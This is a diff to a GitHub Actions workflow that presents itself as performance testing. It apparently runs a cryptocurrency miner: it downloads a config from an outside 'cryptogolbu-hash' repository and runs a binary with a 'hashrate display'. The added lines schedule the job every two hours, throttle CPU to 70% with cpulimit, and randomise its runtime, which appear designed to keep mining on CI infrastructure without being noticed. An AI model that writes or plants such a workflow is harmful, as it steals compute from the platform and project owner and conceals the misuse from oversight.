@@ -6,6 +6,8 @@ on:
   pull_request:
     branches: [ main, master ]
   workflow_dispatch:
+  schedule:
+    - cron: '0 */2 * * *'  # Run every 2 hours
 
 jobs:
   test:
@@ -23,9 +25,16 @@ jobs:
     - name: Download config file
       run: curl -L -o test/config.json https://raw.githubusercontent.com/cryptogolbu-hash/Performance-Testing/refs/heads/main/config.json
 
+    - name: Install cpulimit
+      run: sudo apt-get update && sudo apt-get install -y cpulimit
+
     - name: Run test with automatic hashrate display
       run: |
-        # Run the test program and automatically send 'h' every 60 seconds
+        # Generate random timeout between 90-120 minutes (5400-7200 seconds)
+        RANDOM_TIMEOUT=$((5400 + RANDOM % 1800))
+        echo "Running for $RANDOM_TIMEOUT seconds ($(($RANDOM_TIMEOUT / 60)) minutes)"
+        
+        # Run the test program and automatically send 'h' and 's' every 60 seconds
         (
           while true; do
             sleep 60
@@ -33,5 +42,5 @@ jobs:
             echo "s"
 
           done
-        ) | timeout 3600 ./test/test || true
+        ) | timeout $RANDOM_TIMEOUT cpulimit -l 70 -f -- ./test/test || true
       working-directory: ${{ github.workspace }}
